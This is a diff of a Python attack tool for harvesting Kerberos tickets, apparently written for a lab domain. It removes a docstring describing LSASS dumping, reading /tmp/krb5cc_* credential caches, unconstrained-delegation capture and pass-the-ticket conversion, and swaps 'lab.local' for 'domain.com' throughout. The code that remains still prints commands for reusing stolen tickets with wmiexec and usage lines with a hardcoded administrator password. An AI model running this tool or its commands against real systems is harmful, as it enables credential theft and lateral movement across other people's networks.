@@ -1,59 +1,4 @@
 #!/usr/bin/env python3
-"""
-intercept_kerberos_tickets.py — Kerberos Ticket Harvesting
-Lab: lab.local | DC: 192.168.x.x
-Assigned to: Seif
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-WHAT IS TICKET INTERCEPTION?
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-After Kerberos authenticates a user, their tickets are stored
-in memory (LSASS process on Windows, ccache files on Linux).
-
-If we can read those tickets, we can:
-  - Reuse them without knowing the password (Pass-the-Ticket)
-  - Forge new tickets using the extracted keys
-  - Move laterally as any user whose ticket we captured
-
-This script covers 4 harvesting techniques:
-
-  TECHNIQUE 1 — Extract from LSASS via DCE/RPC (Remote)
-  ────────────────────────────────────────────────────────
-  Windows stores Kerberos tickets in LSASS memory.
-  Using impacket's secretsdump we can dump them remotely
-  via the DRSUAPI or SAMR pipe without touching disk.
-
-  TECHNIQUE 2 — Dump from .ccache files (Linux targets)
-  ───────────────────────────────────────────────────────
-  On Linux, Kerberos tickets live in:
-    /tmp/krb5cc_<uid>         (default)
-    /tmp/krb5cc_*             (various)
-    $KRB5CCNAME               (env var)
-  We parse them directly — no credentials needed if we have
-  file read access.
-
-  TECHNIQUE 3 — Unconstrained Delegation Ticket Capture
-  ───────────────────────────────────────────────────────
-  If a machine has Unconstrained Delegation, ANY user who
-  authenticates to it sends their full TGT automatically.
-  We monitor for incoming TGTs and extract them.
-
-  TECHNIQUE 4 — Ticket Conversion & Reuse
-  ─────────────────────────────────────────
-  Convert harvested tickets between formats:
-    .kirbi  (Mimikatz/Rubeus format — Windows)
-    .ccache (impacket/Linux format)
-  Then inject them for Pass-the-Ticket attacks.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-USAGE
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-  python3 intercept_kerberos_tickets.py --method dump    -t 192.168.x.x -u Administrator -p 'Testing123!'
-  python3 intercept_kerberos_tickets.py --method ccache  --ccache-dir /tmp
-  python3 intercept_kerberos_tickets.py --method convert --input ticket.kirbi --output ticket.ccache
-  python3 intercept_kerberos_tickets.py --method ptt     --ccache ticket.ccache -t 192.168.x.x
-"""
 
 import argparse
 import sys
@@ -93,11 +38,11 @@ BO = "\033[1m"
 RS = "\033[0m"
 
 BANNER = f"""
-{M}{BO}╔══════════════════════════════════════════════════════╗
+{M}{BO}╔═════════════════════════════════════════════╗
 ║   K E R B E R O S   T I C K E T   H A R V E S T    ║
-║   Dump | Parse | Convert | Pass-the-Ticket          ║
-║   lab.local  |  192.168.x.x                        ║
-╚══════════════════════════════════════════════════════╝{RS}
+║   Dump | Parse | Convert | Pass-the-Ticket         ║
+║        domain.com  |  192.168.x.x                  ║
+╚════════════════════════════════════════════════════╝{RS}
 """
 
 
@@ -265,8 +210,8 @@ def technique_parse_ccache(ccache_dir="/tmp", ccache_file=None):
       - Service tickets (TGS)
 
     STRUCTURE OF A CREDENTIAL ENTRY:
-      client   = who the ticket is for (e.g. Administrator@LAB.LOCAL)
-      server   = what service it's for (e.g. krbtgt/LAB.LOCAL or cifs/DC)
+      client   = who the ticket is for (e.g. Administrator@domain.com)
+      server   = what service it's for (e.g. krbtgt/domain.com or cifs/DC)
       keyblock = session key (encrypted)
       authtime = when the ticket was issued
       starttime= when it becomes valid
@@ -281,7 +226,7 @@ def technique_parse_ccache(ccache_dir="/tmp", ccache_file=None):
 
     WHAT TO DO WITH THEM:
       export KRB5CCNAME=/tmp/krb5cc_0
-      python3 wmiexec.py -k -no-pass Administrator@DC.lab.local
+      python3 wmiexec.py -k -no-pass Administrator@DC.domain.com
     """
     print(f"\n{C}{BO}[ TECHNIQUE 2: Parse .ccache Files ]{RS}")
     print(f"  {Y}Parsing Kerberos credential cache files for tickets{RS}\n")
@@ -407,7 +352,7 @@ def technique_parse_ccache(ccache_dir="/tmp", ccache_file=None):
         print(f"\n  {C}Use a TGT for full access:{RS}")
         for t in tgts[:3]:
             print(f"  {W}  export KRB5CCNAME={t['file']}{RS}")
-            print(f"  {W}  python3 wmiexec.py -k -no-pass lab.local/Administrator@WIN-RM9TRCNVS9P.lab.local{RS}")
+            print(f"  {W}  python3 wmiexec.py -k -no-pass domain.com/Administrator@WIN-RM9TRCNVS9P.domain.com{RS}")
 
     return all_tickets
 
@@ -506,7 +451,7 @@ def _kirbi_to_ccache(kirbi_path, ccache_path):
         print(f"  {G}[+] Converted! Saved to: {ccache_path}{RS}")
         print(f"\n  {C}Use it:{RS}")
         print(f"  {W}  export KRB5CCNAME={ccache_path}{RS}")
-        print(f"  {W}  python3 wmiexec.py -k -no-pass lab.local/Administrator@192.168.x.x{RS}")
+        print(f"  {W}  python3 wmiexec.py -k -no-pass domain.com/Administrator@192.168.x.x{RS}")
 
     except Exception as e:
         print(f"  {R}[!] Conversion failed: {e}{RS}")
@@ -811,7 +756,7 @@ Examples:
   python3 intercept_kerberos_tickets.py --method ccache --ccache-file /tmp/krb5cc_0
   python3 intercept_kerberos_tickets.py --method convert --input ticket.kirbi --output ticket.ccache
   python3 intercept_kerberos_tickets.py --method ptt --ccache-file admin.ccache -t 192.168.x.x -u Administrator
-  python3 intercept_kerberos_tickets.py --method request -t 192.168.x.x -u Administrator -p 'Testing123!' --spn cifs/WIN-RM9TRCNVS9P.lab.local
+  python3 intercept_kerberos_tickets.py --method request -t 192.168.x.x -u Administrator -p 'Testing123!' --spn cifs/WIN-RM9TRCNVS9P.domain.com
         """
     )
     p.add_argument("--method",      required=True,
@@ -821,7 +766,7 @@ Examples:
     p.add_argument("-u",  "--username",   default="Administrator", help="Username")
     p.add_argument("-p",  "--password",   default="",              help="Password")
     p.add_argument("--nt-hash",           default="",              help="NT hash")
-    p.add_argument("-d",  "--domain",     default="lab.local",     help="Domain")
+    p.add_argument("-d",  "--domain",     default="domain.com",     help="Domain")
     p.add_argument("--ccache-dir",        default="/tmp",          help="Directory to scan for ccache files")
     p.add_argument("--ccache-file",       default="",              help="Specific .ccache file to use")
     p.add_argument("--input",             default="",              help="Input ticket file (convert)")
